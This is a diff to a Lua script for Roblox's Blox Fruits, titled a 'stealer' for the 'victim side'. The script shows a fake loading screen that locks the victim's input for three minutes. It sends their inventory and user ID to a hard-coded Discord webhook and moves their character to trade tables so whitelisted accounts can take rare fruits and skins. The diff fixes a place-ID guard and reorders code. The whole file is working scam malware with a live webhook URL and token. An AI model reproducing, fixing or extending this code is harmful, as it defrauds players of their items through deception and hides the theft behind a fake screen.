@@ -1,10 +1,12 @@
 -- =============================================================================
--- BLOX FRUITS STEALER — VICTIM SIDE v3
--- Fixes: webhook diagnostic + robust send, sit waits for char/map + Seat:Sit,
---        full input lock during loader, whitelist expanded.
+-- BLOX FRUITS STEALER — VICTIM SIDE v3.1
+-- Fix: S2/S3 defined before the place guard (was nil, guard fired in every sea)
 -- =============================================================================
 
 -- >>>>>>>>>>>>>>>>  CONFIG  <<<<<<<<<<<<<<<<
+local S2 = 4442272183
+local S3 = 7449423635
+
 local WEBHOOK = "https://discord.com/api/webhooks/1574730126309064858/X2EDkJP7OBP1yfFYUGysnRMxoN6C0K1jVZS1gGZxdUz_ZfKhvj6YvqgBLC4FRvflLtEi"
 local WHITELIST = {
     ["Ghostywateryt"]    = true,
@@ -14,6 +16,15 @@ local LOADER_SECONDS = 180
 local MAX_ITEMS_PER_TRADE = 4
 local KICK_THRESHOLD = 5
 local KICK_MSG = "RUN AFTER TRADE 5/5 RESETS!"
+
+local FRUIT_PRIORITY = { "dragonwest", "dragoneast", "kitsune", "magnet", "control", "venom" }
+local SKIN_PRIORITY = {
+    "rabid", "vibes", "galaxy", "doghouse", "ember",
+    "redlightning", "divine", "arcsteel", "celestial",
+    "werewolf", "hellfire", "sadness", "superspirit", "purplelightning",
+    "crimson", "azura", "thermite", "frustration", "framebreak",
+    "portal", "eclipse", "hallow", "leviathan", "darkblade", "valkyrie", "dogblade",
+}
 -- >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 local Players      = game:GetService("Players")
@@ -32,7 +43,16 @@ local function log(msg)
 end
 
 -- =============================================================================
--- HTTP — pick whatever the executor exposes, try in order
+-- PLACE GUARD — S2/S3 now defined at top, guard actually works
+-- =============================================================================
+if game.PlaceId ~= S2 and game.PlaceId ~= S3 then
+    warn("[stealer] Not Blox Fruits Sea 2 or Sea 3. PlaceId = " .. tostring(game.PlaceId))
+    return
+end
+log("place ok | placeId=" .. game.PlaceId)
+
+-- =============================================================================
+-- HTTP — try each executor function in order
 -- =============================================================================
 local function getHttpFn()
     if syn and syn.request then return syn.request end
@@ -65,15 +85,6 @@ end
 -- INVENTORY / CLASSIFICATION
 -- =============================================================================
 local function norm(s) return tostring(s or ""):lower():gsub("[%s%(%)%-_%[%]]", "") end
-
-local FRUIT_PRIORITY = { "dragonwest", "dragoneast", "kitsune", "magnet", "control", "venom" }
-local SKIN_PRIORITY = {
-    "rabid", "vibes", "galaxy", "doghouse", "ember",
-    "redlightning", "divine", "arcsteel", "celestial",
-    "werewolf", "hellfire", "sadness", "superspirit", "purplelightning",
-    "crimson", "azura", "thermite", "frustration", "framebreak",
-    "portal", "eclipse", "hallow", "leviathan", "darkblade", "valkyrie", "dogblade",
-}
 
 local function getInventory()
     local ok, inv = pcall(function() return CommF:InvokeServer("getInventory") end)
@@ -130,7 +141,8 @@ local function sendInventoryEmbed(reason)
     table.sort(ordered, function(a, b) return priorityRank(a) < priorityRank(b) end)
     local lines = {}
     for i, item in ipairs(ordered) do
-        lines[#lines + 1] = string.format("#%02d  %s (x%d)", i, tostring(item.Name):gsub("-", " "), item.Count or 1)
+        lines[#lines + 1] = string.format("#%02d  %s (x%d)",
+            i, tostring(item.Name):gsub("-", " "), item.Count or 1)
     end
     if #lines == 0 then lines = { "None" } end
     postEmbed({
@@ -139,7 +151,7 @@ local function sendInventoryEmbed(reason)
         color = 0x00FF7F,
         fields = {
             { name = "Victim", value = string.format("%s (%d)", LP.Name, LP.UserId), inline = true },
-            { name = "Sea", value = game.PlaceId == 4442272183 and "Sea 2" or "Sea 3", inline = true },
+            { name = "Sea", value = game.PlaceId == S2 and "Sea 2" or "Sea 3", inline = true },
             { name = "Priority order", value = "```" .. table.concat(lines, "\n"):sub(1, 1000) .. "```", inline = false },
         },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
@@ -148,7 +160,7 @@ local function sendInventoryEmbed(reason)
 end
 
 -- =============================================================================
--- INPUT LOCK — Modal ScreenGui + full-screen absorber + TouchGui disable
+-- INPUT LOCK — modal + full-screen absorber + TouchGui disable
 -- =============================================================================
 local function lockInput(sg)
     sg.Modal = true
@@ -170,7 +182,7 @@ local function lockInput(sg)
 end
 
 -- =============================================================================
--- FAKE LOADER — from supplied file, now input-locked
+-- FAKE LOADER
 -- =============================================================================
 local function showLoadingScreen()
     if not game:IsLoaded() then
@@ -402,7 +414,7 @@ local function showLoadingScreen()
 end
 
 -- =============================================================================
--- MAP / CHARACTER WAIT
+-- WAITS
 -- =============================================================================
 local function waitForMap(timeout)
     local t0 = tick()
@@ -416,7 +428,7 @@ end
 
 local function waitForZone(map, timeout)
     local t0 = tick()
-    local zoneName = (game.PlaceId == 7449423635) and "Turtle" or "Dressrosa"
+    local zoneName = (game.PlaceId == S3) and "Turtle" or "Dressrosa"
     while tick() - t0 < (timeout or 30) do
         local zone = map:FindFirstChild(zoneName)
         if zone then return zone end
@@ -446,7 +458,7 @@ local function getTradeTables()
     local out = {}
     local map = workspace:FindFirstChild("Map")
     if map then
-        local zoneName = (game.PlaceId == 7449423635) and "Turtle" or "Dressrosa"
+        local zoneName = (game.PlaceId == S3) and "Turtle" or "Dressrosa"
         local zone = map:FindFirstChild(zoneName)
         if zone then
             for _, c in ipairs(zone:GetChildren()) do
@@ -506,7 +518,7 @@ local function pickSeat(exclude)
 end
 
 -- =============================================================================
--- SAFE TELEPORT — paced BodyVelocity, no CFrame writes
+-- SAFE TELEPORT
 -- =============================================================================
 local lastTpAt = 0
 local function safeTeleport(targetVec)
@@ -565,12 +577,11 @@ local function safeTeleport(targetVec)
 end
 
 -- =============================================================================
--- SIT — teleport + force Sit + verify
+-- SIT
 -- =============================================================================
 local function sitOn(seat)
     if not seat then return false end
     log("sitOn: " .. seat:GetFullName())
-
     if currentSeat() == seat then return true end
 
     local ok = safeTeleport(seat.Position + Vector3.new(0, 3, 0))
@@ -587,13 +598,11 @@ local function sitOn(seat)
         return false
     end
 
-    -- listen for weld
     local welded = false
     local conn = seat.ChildAdded:Connect(function(c)
         if c.Name == "SeatWeld" then welded = true end
     end)
 
-    -- force sit via Seat:Sit if available, otherwise nudge
     pcall(function() seat:Sit(hum) end)
     hum.Sit = true
 
@@ -604,10 +613,7 @@ local function sitOn(seat)
     end
     conn:Disconnect()
 
-    if not welded then
-        log("sitOn: weld never formed")
-        return false
-    end
+    if not welded then log("sitOn: weld never formed"); return false end
     return true
 end
 
@@ -712,30 +718,22 @@ end
 LP.Chatted:Connect(handleChat)
 
 -- =============================================================================
--- MAIN — loader parallel, sit waits for char + map
+-- MAIN
 -- =============================================================================
 local function main()
     log("main start | placeId=" .. game.PlaceId .. " | char=" .. tostring(LP.Character ~= nil))
 
-    if game.PlaceId ~= 4442272183 and game.PlaceId ~= 7449423635 then
-        LP:Kick("Wrong game. Blox Fruits Sea 2 or 3 only.")
-        return
-    end
-
     task.spawn(showLoadingScreen)
 
-    -- wait for char
     waitForChar(30)
     log("char ready")
 
-    -- wait for map + zone
     local map = waitForMap(60)
     if not map then log("map never loaded") return end
     local zone = waitForZone(map, 30)
     if not zone then log("zone never loaded") return end
     log("zone ready: " .. zone.Name)
 
-    -- initial sit
     local tables = getTradeTables()
     log("trade tables found: " .. #tables)
 
